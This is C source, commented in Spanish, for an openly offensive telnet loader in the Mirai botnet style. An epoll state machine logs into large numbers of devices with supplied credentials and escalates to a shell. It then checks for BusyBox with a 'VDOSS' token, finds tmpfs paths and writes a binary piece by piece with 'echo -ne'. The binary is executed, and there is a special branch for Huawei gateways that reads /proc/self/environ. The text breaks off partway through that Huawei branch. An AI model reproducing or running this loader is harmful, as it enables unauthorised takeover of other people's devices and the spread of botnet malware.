/**************************************************************************
 * Archivo: single_load.c
 * 
 * Descripción: Herramienta para cargar y ejecutar binarios en sistemas remotos
 * a través de conexiones Telnet. Utiliza técnicas avanzadas de inyección
 * y evasión para cargar binarios en dispositivos comprometidos.
 * 
 * Funcionalidades:
 * - Conexión masiva a dispositivos vía Telnet
 * - Inyección de binarios en sistemas remotos
 * - Manejo de múltiples sesiones concurrentes
 * - Soporte para diferentes arquitecturas
 * 
 * Notas técnicas:
 * - Usa epoll para manejo eficiente de conexiones
 * - Implementa máquina de estados para gestión de sesiones
 * - Soporte para manipulación de binarios ELF
 **************************************************************************/

/* Habilita extensiones GNU */
#define _GNU_SOURCE

/***************************************************************************
 * Inclusión de cabeceras necesarias
 **************************************************************************/
#include <assert.h>     /* Aserciones para debugging */
#include <stdio.h>      /* E/S estándar */
#include <stdlib.h>     /* Funciones estándar */
#include <stdarg.h>     /* Argumentos variables */
#include <unistd.h>     /* Llamadas POSIX */
#include <string.h>     /* Manejo de strings */
#include <sys/socket.h> /* API de sockets */
#include <netinet/in.h> /* Estructuras de red */
#include <signal.h>     /* Manejo de señales */
#include <sys/time.h>   /* Funciones de tiempo */
#include <sys/types.h>  /* Tipos básicos */
#include <fcntl.h>      /* Control de archivos */
#include <ctype.h>      /* Clasificación de caracteres */
#include <errno.h>      /* Códigos de error */
#include <arpa/inet.h>  /* Funciones de red */
#include <netinet/ip.h> /* Protocolos IP */
#include <netinet/tcp.h>/* Protocolos TCP */
#include <pthread.h>    /* Hilos POSIX */
#include <sys/queue.h>  /* Estructuras de cola */
#include <sys/epoll.h>  /* API epoll */
#include <glob.h>       /* Expansión de patrones */

/***************************************************************************
 * Definiciones y constantes
 **************************************************************************/

/* Tokens para verificación de comandos y ejecución */
#define TOKEN           "/bin/busybox VDOSS"    /* Comando de prueba para busybox */
#define TOKEN_VERIFY    "applet not found"      /* Respuesta esperada de busybox */
#define EXEC_VERIFY     "YESHELLO"              /* Token de verificación de ejecución */

/* Constantes para manejo de binarios */
#define BYTES_PER_LINE      128                 /* Bytes por línea en la carga */
#define CHARS_PER_BYTE      5                   /* Caracteres por byte (\\xXX) */
#define MAX_SLICE_LENGTH    (BYTES_PER_LINE * CHARS_PER_BYTE) /* Tamaño máximo de slice */

/* Variables globales de configuración */
static char *bind_ip = "0.0.0.0";              /* IP para bind de conexiones */
static unsigned char debug_mode = 0;            /* Modo de depuración */
static int maxConnectedSockets = 0;             /* Límite de conexiones simultáneas */

/***************************************************************************
 * Variables globales de servidor
 ***************************************************************************/
static char *bin_server = NULL;              /* Servidor de binarios */
static unsigned short bin_port = NULL;       /* Puerto del servidor */
static char *bin_path = NULL;               /* Ruta del binario */

/***************************************************************************
 * Contadores y estadísticas volátiles
 ***************************************************************************/
volatile int running_threads = 0;            /* Hilos activos */
volatile unsigned long found_srvs = 0;       /* Servidores encontrados */
volatile unsigned int bytes_sent = 0;        /* Bytes enviados */
volatile unsigned long timed_out = 0;        /* Conexiones timeout */
volatile unsigned long login_done = 0;       /* Logins completados */
volatile unsigned long failed_connect = 0;    /* Conexiones fallidas */
volatile unsigned long remote_hangup = 0;     /* Desconexiones remotas */
volatile unsigned short port = 0;            /* Puerto actual */
volatile unsigned int maxFDSaw = 0;         /* Máximo FD visto */

/* Archivo de entrada y argumentos */
FILE *infd;                                 /* Descriptor archivo entrada */
char *run_arg = NULL;                       /* Argumento de ejecución */

/* Descriptor epoll */
static int epollFD;                         /* FD para epoll */

/***************************************************************************
 * Estructura para gestión de estados de conexión
 * 
 * Mantiene el estado y datos de cada conexión activa, incluyendo:
 * - Estado de la conexión
 * - Datos de autenticación
 * - Rutas de carga
 * - Sincronización entre hilos
 ***************************************************************************/
struct stateSlot_t
{
    int slotUsed;                           /* Slot en uso */
    
    pthread_mutex_t mutex;                  /* Mutex para sincronización */
    
    /* Flags de estado */
    unsigned char success;                  /* Operación exitosa */
    unsigned char is_open;                  /* Conexión abierta */
    unsigned char special;                  /* Manejo especial (ej: Huawei) */
    unsigned char got_prompt;               /* Recibió prompt */
    
    uint8_t pathInd;                       /* Índice de ruta actual */
    
    uint16_t echoInd;                      /* Índice de echo actual */
    
    int complete;                          /* Operación completada */
    uint32_t ip;                           /* IP del objetivo */
    
    int fd;                                /* Descriptor de archivo */
    int updatedAt;                         /* Última actualización */
    int reconnecting;                      /* En proceso de reconexión */
    
    unsigned char state;                    /* Estado de la máquina de estados */
    
    /* Buffers de datos */
    char path[5][32];                      /* Rutas para carga */
    char username[32];                     /* Usuario para login */
    char password[32];                     /* Contraseña para login */
};

/***************************************************************************
 * Estructura para gestión del binario a cargar
 * 
 * Almacena el binario dividido en slices para su carga
 ***************************************************************************/
struct {
    int num_slices;                        /* Número de slices */
    unsigned char **slices;                /* Array de slices */
} binary;

/* Tabla de estados para todas las conexiones */
struct stateSlot_t stateTable[1024 * 100] = {0};

/* Declaración externa de función matemática */
extern float ceilf (float x);

/**
 * Función de utilidad para garantizar valores no negativos
 * 
 * @param val Valor a verificar
 * @return    El valor si es positivo, 0 si es negativo
 */
static int diff(int val)
{
    return (val > 0) ? val : 0;
}

/**
 * Verifica si un buffer contiene un prompt de shell
 * 
 * Esta función analiza el buffer de entrada buscando caracteres
 * típicos de prompts de shell (:>%$#). Maneja secuencias ANSI
 * y limpia el buffer antes de hacer la comparación.
 * 
 * Proceso:
 * 1. Crea buffer temporal
 * 2. Elimina secuencias de escape ANSI
 * 3. Busca caracteres de prompt
 * 
 * @param bufStr  Buffer a analizar
 * @return        1 si encuentra prompt, 0 en caso contrario
 */
int matchPrompt(char *bufStr)
{
    int i = 0, q = 0;
    char *prompts = ":>%$#";               /* Caracteres de prompt comunes */
    
    /* Crear buffer temporal */
    char *tmpStr = malloc(strlen(bufStr) + 1);
    memset(tmpStr, 0, strlen(bufStr) + 1);
    
    /* Eliminar secuencias de escape ANSI */
    char in_escape = 0;                    /* Flag para secuencia de escape */
    for (i = 0; i < strlen(bufStr); i++)
    {
        if (bufStr[i] == '\x1B')          /* Inicio de secuencia ANSI */
        {
            if (in_escape == 0) 
                in_escape = 1;
        } 
        /* Final de secuencia ANSI */
        else if ((in_escape == 1) && (strchr("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", bufStr[i]) != NULL))
        {
            in_escape = 0;
        } 
        /* Caracter normal, copiarlo si no estamos en secuencia */
        else if (in_escape == 0) 
        {
            strncat(tmpStr, &(bufStr[i]), 1);
        }
    }
    
    /* Buscar caracteres de prompt al final del buffer */
    int bufLen = strlen(tmpStr);
    for(i = 0; i < strlen(prompts); i++)
    {
        /* Saltar espacios y caracteres de control al final */
        while(bufLen > q && (*(tmpStr + bufLen - q) == 0x00 || 
                            *(tmpStr + bufLen - q) == ' ' || 
                            *(tmpStr + bufLen - q) == '\r' || 
                            *(tmpStr + bufLen - q) == '\n')) q++;
        
        /* Verificar si encontramos un prompt */
        if(*(tmpStr + bufLen - q) == prompts[i])
        {
            free(tmpStr);
            return 1;                       /* Prompt encontrado */
        }           
    }
    
    free(tmpStr);
    return 0;                              /* No se encontró prompt */
}

/**
 * Genera un volcado hexadecimal de memoria
 * 
 * Esta función muestra el contenido de un bloque de memoria en formato
 * hexadecimal y ASCII. Útil para depuración y análisis de datos.
 * 
 * Formato de salida:
 * - Muestra offset en hexadecimal
 * - 16 bytes por línea en hex
 * - Representación ASCII al final de cada línea
 * - Caracteres no imprimibles mostrados como '.'
 * 
 * @param desc  Descripción del volcado (puede ser NULL)
 * @param addr  Dirección de memoria a volcar
 * @param len   Longitud en bytes a volcar
 */
void hexDump(char *desc, void *addr, int len)
{
    int i;
    unsigned char buff[17];                /* Buffer para caracteres ASCII */
    unsigned char *pc = (unsigned char*)addr;
    
    /* Mostrar descripción si existe */
    if (desc != NULL) printf ("%s:\n", desc);
    
    /* Procesar cada byte */
    for (i = 0; i < len; i++) {
        /* Nueva línea cada 16 bytes */
        if ((i % 16) == 0)
        {
            if (i != 0) printf ("  %s\n", buff);
            printf ("  %04x ", i);         /* Offset en hex */
        }
        
        printf (" %02x", pc[i]);          /* Byte en hex */
        
        /* Almacenar caracter ASCII (o '.' si no es imprimible) */
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) 
            buff[i % 16] = '.';
        else 
            buff[i % 16] = pc[i];
        
        buff[(i % 16) + 1] = '\0';        /* Terminar string ASCII */
    }
    
    /* Rellenar última línea si es necesario */
    while ((i % 16) != 0)
    {
        printf ("   ");
        i++;
    }
    
    /* Mostrar últimos caracteres ASCII */
    printf ("  %s\n", buff);
}

/**
 * Recibe datos de un socket con logging
 * 
 * Función wrapper para recv() que incluye:
 * - Limpieza de buffer
 * - Reemplazo de nulos por 'A'
 * - Logging en modo debug
 * 
 * @param sock   Socket descriptor
 * @param buf    Buffer para datos
 * @param len    Longitud máxima a recibir
 * @param flags  Flags para recv()
 * @return       Número de bytes recibidos o -1 si error
 */
int log_recv(int sock, void *buf, int len, int flags)
{
    /* Limpiar buffer */
    memset(buf, 0, len);
    
    /* Recibir datos */
    int ret = recv(sock, buf, len, flags);
    
    /* Procesar datos recibidos */
    if (ret > 0)
    {
        int i = 0;
        /* Reemplazar caracteres nulos por 'A' */
        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }
    
    /* Logging en modo debug */
    if (debug_mode)
    {
        char hex_buf[32] = {0};
        sprintf(hex_buf, "estado %d - recibido: %d", stateTable[sock].state, ret);
        if (ret != -1)
            hexDump(hex_buf, buf, ret);
        else
            printf("%s\n", hex_buf);
    }
    return ret;
}

/**
 * Envía datos por un socket con logging
 * 
 * Función wrapper para send() que incluye:
 * - Conteo de bytes enviados
 * - Logging en modo debug
 * 
 * @param sock   Socket descriptor
 * @param buf    Buffer con datos
 * @param len    Longitud a enviar
 * @param flags  Flags para send()
 * @return       Número de bytes enviados o -1 si error
 */
int log_send(int sock, void *buf, int len, int flags)
{
    /* Logging en modo debug */
    if (debug_mode)
    {
        char hex_buf[32] = {0};
        sprintf(hex_buf, "estado %d - enviado: %d", stateTable[sock].state, len);
        hexDump(hex_buf, buf, len);
    }
    
    /* Actualizar contador de bytes */
    bytes_sent += len;
    
    /* Enviar datos */
    return send(sock, buf, len, flags);
}

/**
 * Envía datos formateados por un socket
 * 
 * Función tipo printf para sockets que:
 * - Formatea texto con argumentos variables
 * - Envía usando log_send
 * - Maneja señales
 * 
 * @param sock       Socket descriptor
 * @param formatStr  String de formato
 * @param ...        Argumentos variables
 * @return           Número de bytes enviados o -1 si error
 */
int sockprintf(int sock, char *formatStr, ...)
{
    char textBuffer[2048] = {0};          /* Buffer para texto formateado */
    memset(textBuffer, 0, 2048);
    
    /* Procesar argumentos variables */
    va_list args;
    va_start(args, formatStr);
    vsprintf(textBuffer, formatStr, args);
    va_end(args);
    
    /* Enviar usando log_send */
    int q = log_send(sock, textBuffer, strlen(textBuffer), MSG_NOSIGNAL);
    return q;
}

/**
 * Implementación de memmem() para buscar subcadenas en memoria
 * 
 * Busca una subcadena dentro de un bloque de memoria.
 * Similar a strstr() pero para bloques de memoria arbitrarios.
 * 
 * @param l      Bloque de memoria donde buscar
 * @param l_len  Longitud del bloque principal
 * @param s      Subcadena a buscar
 * @param s_len  Longitud de la subcadena
 * @return       Puntero al inicio de la subcadena o NULL si no se encuentra
 */
void *memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
    register char *cur, *last;
    const char *cl = (const char *)l;
    const char *cs = (const char *)s;
    
    /* Validación de parámetros */
    if (l_len == 0 || s_len == 0) 
        return NULL;

    if (l_len < s_len) 
        return NULL;

    /* Optimización para búsqueda de un byte */
    if (s_len == 1) 
        return memchr(l, (int)*cs, l_len);

    /* Búsqueda principal */
    last = (char *)cl + l_len - s_len;
    for (cur = (char *)cl; cur <= last; cur++)
        if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
            return cur;

    return NULL;
}

/**
 * Manejador de desconexión remota
 * 
 * Incrementa el contador de desconexiones remotas
 * 
 * @param fd  Descriptor de socket cerrado
 */
void handle_remote_closed(int fd)
{
    remote_hangup++;
}

/**
 * Manejador de timeout de conexión
 * 
 * Incrementa el contador de timeouts
 * 
 * @param fd  Descriptor de socket con timeout
 */
void handle_timeout(int fd)
{
    timed_out++;
}

/**
 * Manejador de fallo de conexión
 * 
 * Incrementa el contador de conexiones fallidas
 * 
 * @param fd  Descriptor de socket fallido
 */
void handle_failed_connect(int fd)
{
    failed_connect++;
}

/**
 * Manejador de servidor encontrado
 * 
 * Registra un servidor exitosamente comprometido
 * El código comentado muestra la funcionalidad original
 * de logging detallado a archivo.
 * 
 * @param fd  Descriptor de socket del servidor
 */
void handle_found(int fd)
{
    /* 
    // Código original para logging detallado
    struct stateSlot_t *state = &stateTable[fd];
    
    struct sockaddr_in name;
    int namelen = (sizeof (struct sockaddr_in));

    getpeername(state->fd, &name, &namelen);
    
    FILE *fp = fopen("loaded.txt", "a");
    fprintf(outfd, "%d.%d.%d.%d:%s:%s:%s:%d:%d:%d\n",
        (name.sin_addr.s_addr & 0xff), 
        ((name.sin_addr.s_addr & (0xff << 8)) >> 8), 
        ((name.sin_addr.s_addr & (0xff << 16)) >> 16),
        ((name.sin_addr.s_addr & (0xff << 24)) >> 24), 
        
        state->username, 
        state->password, 
        state->path, 
        state->wget, 
        state->endianness, 
        state->arch
    );
    fclose(outfd);
    */
    
    /* Incrementar contador de servidores encontrados */
    found_srvs++;
}

/**
 * Cierra y limpia una conexión
 * 
 * Esta función:
 * 1. Resetea todos los campos del slot de estado
 * 2. Cierra el socket de manera segura
 * 3. Libera todos los recursos asociados
 * 
 * @param fd  Descriptor de socket a cerrar
 */
void closeAndCleanup(int fd)
{
    /* Verificar que el slot está en uso y corresponde al FD */
    if(stateTable[fd].slotUsed && stateTable[fd].fd == fd)
    {
        /* Resetear flags de estado */
        stateTable[fd].slotUsed = 0;
        stateTable[fd].state = 0;
        
        /* Limpiar buffers de rutas */
        stateTable[fd].path[0][0] = 0;
        stateTable[fd].path[1][0] = 0;
        stateTable[fd].path[2][0] = 0;
        stateTable[fd].path[3][0] = 0;
        stateTable[fd].path[4][0] = 0;
        
        /* Limpiar credenciales */
        stateTable[fd].username[0] = 0;
        stateTable[fd].password[0] = 0;
        
        /* Resetear índices y flags */
        stateTable[fd].echoInd = 0;
        stateTable[fd].pathInd = 0;
        stateTable[fd].success = 0;
        stateTable[fd].special = 0;
        stateTable[fd].got_prompt = 0;
    
        /* Cerrar socket si está abierto */
        if(stateTable[fd].is_open)
        {
            stateTable[fd].is_open = 0;
            
            /* Cerrar socket de manera limpia */
            shutdown(fd, SHUT_RDWR);
            
            /* Configurar cierre inmediato */
            struct linger linger;
            linger.l_onoff = 1;            /* Activar linger */
            linger.l_linger = 0;           /* Cierre inmediato */
            setsockopt(fd, SOL_SOCKET, SO_LINGER, (char *) &linger, sizeof(linger));
            
            close(fd);                     /* Cerrar descriptor */
        }
    }
}

/**
 * Actualiza el timestamp de último acceso
 * 
 * Mantiene registro del último acceso a una conexión
 * para detectar timeouts.
 * 
 * @param fd  Descriptor de socket a actualizar
 */
void updateAccessTime(int fd)
{
    if(stateTable[fd].slotUsed && stateTable[fd].fd == fd)
    {
        stateTable[fd].updatedAt = time(NULL);
    }
}

/**
 * Obtiene el número total de sockets conectados
 * 
 * Cuenta el número de slots en uso en la tabla de estados
 * 
 * @return  Número de conexiones activas
 */
int getConnectedSockets()
{
    int q = 0, i = 0;
    /* Contar slots en uso */
    for(q = 0; q < maxFDSaw; q++) 
        if(stateTable[q].slotUsed) 
            i++;

    return i;
}

/**
 * Función principal de manejo de conexiones
 * 
 * Esta función implementa una máquina de estados para manejar
 * múltiples conexiones Telnet simultáneamente usando epoll.
 * 
 * Funcionalidades:
 * - Manejo de eventos de conexión/desconexión
 * - Procesamiento de datos entrantes
 * - Control de estados de conexión
 * - Manejo de timeouts
 * - Sincronización entre hilos
 * 
 * @param par1  Parámetro no usado (requerido por pthread)
 * @return      NULL al finalizar
 */
/**
 * Función principal de manejo de eventos epoll (Gestor de Inundación)
 * 
 * Esta función es el núcleo del sistema de manejo de conexiones concurrentes,
 * implementando una máquina de estados para gestionar sesiones Telnet y
 * carga de binarios en dispositivos remotos.
 *
 * Características principales:
 * - Manejo eficiente de múltiples conexiones usando epoll
 * - Procesamiento de eventos de entrada/salida 
 * - Control de estados para cada conexión
 * - Gestión de timeouts y reconexiones
 * - Carga y ejecución de binarios remotos
 *
 * @param par1  Parámetro requerido por pthread (no usado)
 * @return      NULL al finalizar
 */
void *flood(void *par1)
{
    /* Incrementar contador atómico de hilos activos */
    __sync_fetch_and_add(&running_threads, 1);

    /* Buffer para recepción de datos (10KB + 1 byte para null) */
    unsigned char buf[10241] = {0};

    /* Arreglo de estructuras para eventos epoll (máx 25 eventos) */
    struct epoll_event pevents[25] = {0};
    int ret = 0;   /* Resultado de epoll_wait */
    int i = 0;     /* Índice para iteración */
    int got = 0;   /* Bytes recibidos */
    int ii = 0;    /* Índice auxiliar */
    
    /* Bucle principal de monitoreo de eventos 
     * - Espera hasta 10 segundos por eventos
     * - Continúa si es interrumpido por señal (EINTR)
     * - Procesa múltiples eventos en cada iteración
     */
    while((ret = epoll_wait(epollFD, pevents, 25, 10000)) >= 0 || (ret == -1 && errno == EINTR))
    {
        if(ret == 0) continue;  /* Timeout sin eventos, siguiente iteración */
        
        /* Procesar cada evento recibido */
        for(i = 0; i < ret; i++)
        {
            /* Manejar errores y desconexiones */
            if((pevents[i].events & EPOLLERR) || 
               (pevents[i].events & EPOLLHUP) || 
               (pevents[i].events & EPOLLRDHUP) || 
               (!(pevents[i].events & EPOLLIN) && !(pevents[i].events & EPOLLOUT)))
            {
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                
                /* Determinar tipo de error */
                if (state->state == 0) 
                    handle_failed_connect(state->fd);
                else 
                    handle_remote_closed(state->fd);
                
                /* Limpiar conexión de manera segura */
                pthread_mutex_lock(&state->mutex);
                closeAndCleanup(state->fd);
                pthread_mutex_unlock(&state->mutex);
            } 
            /* Manejar datos entrantes */
            else if(pevents[i].events & EPOLLIN)
            {
                int is_closed = 0;
                struct stateSlot_t *state = &stateTable[pevents[i].data.fd];
                
                /* Limpiar buffer de recepción */
                memset(buf, 0, 10241);
                
                /* Bloquear mutex para acceso seguro al estado */
                pthread_mutex_lock(&state->mutex);
                int old_state = state->state;
                
                got = 0;
                do
                {
                    /* Estado 1: Inicio de negociación Telnet */
                    if(state->state == 1)
                    {
                        /* Verificar si es comando Telnet (0xFF) */
                        if ((got = log_recv(state->fd, buf, 1, MSG_PEEK)) > 0 && buf[0] == 0xFF)
                            state->state = 2;  /* Cambiar a estado de negociación */
                        
                        /* No es comando Telnet, pasar a estado normal */
                        if (got > 0 && buf[0] != 0xFF)
                            state->state = 3;
                    }

                    /* Estado 2: Procesamiento de comandos Telnet */
                    if (state->state == 2)
                    {
                        /* Leer byte de comando ya verificado */
                        log_recv(state->fd, buf, 1, 0);
                        
                        /* Leer resto del comando Telnet */
                        got = log_recv(state->fd, buf + 1, 2, 0);
                        if (got > 0)
                        {
                            state->state = 1;  /* Volver a estado inicial */
                            
                            /* Manejo especial de terminal NAWS */
                            if (buf[1] == 0xFD && buf[2] == 31)
                            {
                                /* Enviar respuesta WILL NAWS */
                                unsigned char tmp1[3] = {255, 251, 31};
                                log_send(state->fd, tmp1, 3, MSG_NOSIGNAL);
                                /* Enviar dimensiones de terminal */
                                unsigned char tmp2[9] = {255, 250, 31, 0, 80, 0, 24, 255, 240};
                                log_send(state->fd, tmp2, 9, MSG_NOSIGNAL);
                                continue;
                            }
                            
                            /* Procesar otros comandos Telnet */
                            for (ii = 0; ii < 3; ii++)
                            {
                                    /* Convertir DO a WONT */
                                    if (buf[ii] == 0xFD) buf[ii] = 0xFC;
                                    /* Convertir WILL a DO */
                                    else if (buf[ii] == 0xFB) buf[ii] = 0xFD;
                            }
                            /* Enviar respuesta procesada */
                            log_send(state->fd, buf, 3, MSG_NOSIGNAL);
                        }
                    }
                } while(got > 0 && state->state != 3);
                
                /* Estado 3: Detección inicial del sistema */
                if (state->state == 3)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Caso especial para dispositivos Huawei */
                        if (memmem(buf, got, "Huawei Home Gateway", 19) != NULL)
                            state->special = 1;
                        
                        /* Detectar si ya tenemos shell BusyBox */
                        if (memmem(buf, got, "BusyBox", 7) != NULL)
                        {
                            state->got_prompt = 1;
                            
                            /* Intentar obtener privilegios elevados */
                            sockprintf(state->fd, "enable\r\n");
                            state->state = 7;
                            break;
                        }
                        
                        /* Detectar prompt de login */
                        if (memmem(buf, got, "ogin", 4) != NULL || 
                            memmem(buf, got, "sername", 7) != NULL || 
                            matchPrompt(buf))
                        {
                            state->got_prompt = 1;
                            
                            /* Enviar nombre de usuario */
                            sockprintf(state->fd, "%s\r\n", state->username);
                            state->state = 4;
                            break;
                        }
                    }
                }
                
                /* Estado 4: Manejo de contraseña */
                if (state->state == 4)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Detectar prompt de contraseña */
                        if (memmem(buf, got, "assword", 7) != NULL || matchPrompt(buf))
                        {
                            /* Enviar contraseña */
                            sockprintf(state->fd, "%s\r\n", state->password);
                            state->state = 5;
                            break;
                        }
                    }
                }
                
                /* Estado 5: Verificación de login */
                if (state->state == 5)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Detectar errores de login */
                        if (strcasestr(buf, "access denied") != NULL || 
                            strcasestr(buf, "invalid password") != NULL || 
                            strcasestr(buf, "login incorrect") != NULL || 
                            strcasestr(buf, "password is wrong") != NULL)
                        {
                            /* Login fallido, intentar reconexión */
                            state->state = 254;
                            break;
                        }
                        
                        /* Detectar login exitoso */
                        if (strcasestr(buf, "BusyBox") != NULL || matchPrompt(buf))
                        {
                            /* Solicitar privilegios elevados */
                            sockprintf(state->fd, "enable\r\n");
                            state->state = 6;
                            break;
                        }
                    }
                }
                
                /* Estado 6: Solicitud de shell tras enable */
                if (state->state == 6)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Solicitar shell interactivo */
                        sockprintf(state->fd, "shell\r\n");
                        state->state = 7;
                        break;
                    }
                }
                
                /* Estado 7: Asegurar acceso a shell */
                if (state->state == 7)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Solicitar shell sh específicamente */
                        sockprintf(state->fd, "sh\r\n");
                        if (state->special == 1)
                        {
                            /* Manejo especial para Huawei */
                            state->state = 250;
                        } else {
                            /* Flujo normal */
                            state->state = 8;
                        }
                        break;
                    }
                }
                
                /* Estado 8: Verificación de acceso */
                if (state->state == 8)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (matchPrompt(buf))
                        {
                            /* Enviar comando de verificación */
                            sockprintf(state->fd, "%s\r\n", TOKEN);
                            state->state = 9;
                            break;
                        }
                    }
                }
                
                /* Estado 9: Verificación de Busybox */
                if (state->state == 9)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Verificar respuesta esperada de Busybox */
                        if (strcasestr(buf, TOKEN_VERIFY) != NULL && matchPrompt(buf))
                        {
                            /* Obtener puntos de montaje disponibles */
                            sockprintf(state->fd, "cat /proc/mounts\r\n");
                            state->state = 10;
                            break;
                        }
                    }
                }
                
                /* Estado 10: Análisis de puntos de montaje */
                if (state->state == 10)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Buscar sistemas de archivos en memoria (tmpfs/ramfs) */
                        if (strstr(buf, "tmpfs") != NULL || strstr(buf, "ramfs") != NULL)
                        {
                            char *tmp_buf = buf;
                            char *start = NULL;
                            char *space = NULL;
                            int memes = 0;  /* Contador de puntos de montaje */
                            
                            /* Procesar cada punto de montaje */
                            do
                            {
                                /* Encontrar inicio del sistema de archivos */
                                start = strstr(tmp_buf, "tmpfs") != NULL ? 
                                       strstr(tmp_buf, "tmpfs") : 
                                       strstr(tmp_buf, "ramfs");
                                space = strchr(start, ' ');
                                
                                /* Manejar casos donde el sistema de archivos está en medio de la línea */
                                if (start != tmp_buf && *(start - 1) != '\n')
                                {
                                    /* Retroceder hasta inicio de línea */
                                    while(start > buf && *start != '\n') start--;
                                    
                                    /* Si llegamos al inicio del buffer, continuar */
                                    if (start == buf)
                                        continue;
                                    
                                    start++;
                                    space = strchr(start, ' ');
                                }
                                
                                /* Procesar punto de montaje si comienza con '/' */
                                if (space[1] == '/')
                                {
                                    int iii = 1;

                                    /* Encontrar fin del path */
                                    for (iii = 1; ; iii++) {
                                        if (space[iii] == '\0' || space[iii] == ' ') {
                                            break;
                                        }
                                    }
                                    
                                    /* Almacenar path válido */
                                    if (iii > 1) {
                                        strncpy(state->path[memes], &space[1], iii - 1);
                                        state->path[memes][iii - 1] = '\0';
                                        memes++;
                                    }
                                    
                                    /* Avanzar al siguiente campo */
                                    space = space + iii; 
                                    if (space[0] != '\0')
                                    {
                                        for (iii = 1; ; iii++) {
                                            if (space[iii] == '\0' || space[iii] == ' ') {
                                                break;
                                            }
                                        }
                                        space = space + iii;
                                    } else {
                                        break;
                                    }
                                }
                                
                                tmp_buf = space;
                            } while((strstr(tmp_buf, "tmpfs") != NULL || 
                                   strstr(tmp_buf, "ramfs") != NULL) && memes < 5);
                            
                            /* Si no se encontró ningún path, usar raíz */
                            if (strlen(state->path[0]) == 0)
                            {
                                strcpy(state->path[0], "/");
                            }
                            
                            /* Preparar directorio y copiar shell */
                            sockprintf(state->fd, 
                                     "/bin/busybox mkdir -p %s; "      /* Crear directorio */
                                     "/bin/busybox rm %s/a; "          /* Eliminar archivo si existe */
                                     "/bin/busybox cp -f /bin/sh %s/a" /* Copiar shell */
                                     " && /bin/busybox VDOSS\r\n",     /* Verificar */
                                     state->path[0], state->path[0], state->path[0]);
                            state->state = 100;
                            break;
                        } 
                        /* Si no hay tmpfs/ramfs, usar /var/run */
                        else if (matchPrompt(buf))
                        {
                            strcpy(state->path[0], "/var/run");
                            sockprintf(state->fd, 
                                     "/bin/busybox mkdir -p %s; "
                                     "/bin/busybox rm %s/a; "
                                     "/bin/busybox cp -f /bin/sh %s/a"
                                     " && /bin/busybox VDOSS\r\n",
                                     state->path[0], state->path[0], state->path[0]);
                            state->state = 100;
                            break;
                        }
                    }
                }
                
                /* Estado 100: Verificación de preparación para carga */
                if (state->state == 100)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        /* Si busybox no está disponible, iniciar carga de binario */
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            /* Crear archivo vacío y verificar */
                            sockprintf(state->fd, 
                                     "/bin/busybox echo -ne '' > %s/a && "
                                     "/bin/busybox VDOSS\r\n", 
                                     state->path[state->pathInd]);
                            state->state = 101;
                            break;
                        } 
                        /* Si tenemos prompt, intentar siguiente path */
                        else if (matchPrompt(buf))
                        {
                            state->pathInd++;
                            /* Si agotamos paths, volver a /var/run */
                            if (state->pathInd == 5 || strlen(state->path[state->pathInd]) == 0)
                            {
                                strcpy(state->path[0], "/var/run");
                                state->pathInd = 0;
                                sockprintf(state->fd, 
                                         "/bin/busybox echo -ne '' > %s/a && "
                                         "/bin/busybox VDOSS\r\n", 
                                         state->path[state->pathInd]);
                                state->state = 101;
                                break;
                            }
                            /* Intentar con el siguiente path */
                            sockprintf(state->fd, 
                                     "/bin/busybox mkdir -p %s; "
                                     "/bin/busybox rm %s/a; "
                                     "/bin/busybox cp -f /bin/sh %s/a && "
                                     "/bin/busybox VDOSS\r\n", 
                                     state->path[state->pathInd], 
                                     state->path[state->pathInd], 
                                     state->path[state->pathInd]);
                            break;
                        }
                    }
                }
                
                /* Estado 101: Carga del binario por slices */
                if (state->state == 101)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            /* Agregar siguiente slice del binario */
                            sockprintf(state->fd, 
                                     "/bin/busybox echo -ne %s >> %s/a && "
                                     "/bin/busybox VDOSS\r\n", 
                                     binary.slices[state->echoInd++], 
                                     state->path[state->pathInd]);
                            
                            /* Verificar si completamos la carga */
                            if (state->echoInd == binary.num_slices) 
                                state->state = 102;
                            else 
                                state->state = 101;
                            break;
                        }
                    }
                }
                
                /* Estado 102: Ejecución del binario cargado */
                if (state->state == 102)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            /* Ejecutar binario con argumentos */
                            sockprintf(state->fd, 
                                     "%s/a %s; "
                                     "/bin/busybox VDOSS\r\n", 
                                     state->path[state->pathInd], 
                                     run_arg);
                            state->state = 103;
                            break;
                        }
                    }
                }
                
                /* Estado 103: Verificación final de ejecución */
                if (state->state == 103)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (strcasestr(buf, "applet not found") != NULL)
                        {
                            /* Marcar para finalización */
                            state->state = 255;
                            break;
                        }
                    }
                }
                
                /* Estado 250: Manejo especial Huawei - inicio */
                if (state->state == 250)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
                        if (matchPrompt(buf))
                        {
                            /* Obtener variables de entorno */
                            sockprintf(state->fd, "show text /proc/self/environ\r\n");
                            state->state = 251;
                            break;
                        }
                    }
                }
                
                /* Estado 251: Manejo especial Huawei - configuración */
                if (state->state == 251)
                {
                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                    {
